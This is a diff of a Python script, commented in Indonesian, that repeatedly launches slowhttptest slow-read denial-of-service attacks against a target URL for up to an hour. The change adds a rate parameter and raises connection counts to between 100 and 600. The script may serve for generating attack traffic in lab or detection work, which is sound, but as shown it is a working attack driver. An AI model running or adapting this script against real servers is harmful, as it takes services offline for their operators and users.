@@ -53,32 +53,32 @@ if len(sys.argv) > 1:
 else:
     TOTAL_RUNTIME = 3600
 
-# List of attack configurations: (attack_name, total_connections, readrate_list)
-# Format readrate: ["32/5"], ["5/1", "10/5", "15/5"], dst.
+# List of attack configurations: (attack_name, total_connections, rate, readrate_list)
+# Format: attack_100 -> -c 100 -r 50, dst.
 attack_configs = [
-    ("attack_100", 50, ["32/5"]),
-    ("attack_200", 50, ["5/1", "10/5", "15/5"]),
-    ("attack_300", 50, ["5/1", "5/1", "15/1"]),
-    ("attack_500", 50, ["10/5", "15/5"]),
-    ("attack_600", 50, ["10/5", "15/5"]),
+    ("attack_100", 100, 50, ["32/5"]),
+    ("attack_200", 200, 50, ["5/1", "10/5", "15/5"]),
+    ("attack_300", 300, 50, ["5/1", "5/1", "15/1"]),
+    ("attack_500", 500, 50, ["10/5", "15/5"]),
+    ("attack_600", 600, 50, ["10/5", "15/5"]),
 ]
 
 # Runtime per attack (detik)
 RUNTIME_PER_ATTACK = 240
 
-def run_attack(attack_name, total_connections, readrate_list, runtime):
+def run_attack(attack_name, total_connections, rate, readrate_list, runtime):
     for readrate in readrate_list:
-        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, runtime: {runtime}, readrate: {readrate}")
-        attack_cmd = f"slowhttptest -c {total_connections} -r {total_connections} -X -t GET -u {TARGET_URL} -z {readrate} -w 8 -y 16 -l {runtime}"
+        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, rate: {rate}, runtime: {runtime}, readrate: {readrate}")
+        attack_cmd = f"slowhttptest -c {total_connections} -r {rate} -X -t GET -u {TARGET_URL} -z {readrate} -w 8 -y 16 -l {runtime}"
         print(f"[INFO] Menjalankan: {attack_cmd}")
         subprocess.run(attack_cmd, shell=True)
 
 if __name__ == "__main__":
     start_time = time.time()
     while True:
-        for attack_name, total_connections, readrates in attack_configs:
+        for attack_name, total_connections, rate, readrates in attack_configs:
             elapsed = time.time() - start_time
             if elapsed >= TOTAL_RUNTIME:
                 print(f"\n[INFO] Waktu total {TOTAL_RUNTIME} detik sudah tercapai. Selesai.")
                 sys.exit(0)
-            run_attack(attack_name, total_connections, readrates, RUNTIME_PER_ATTACK)
+            run_attack(attack_name, total_connections, rate, readrates, RUNTIME_PER_ATTACK)
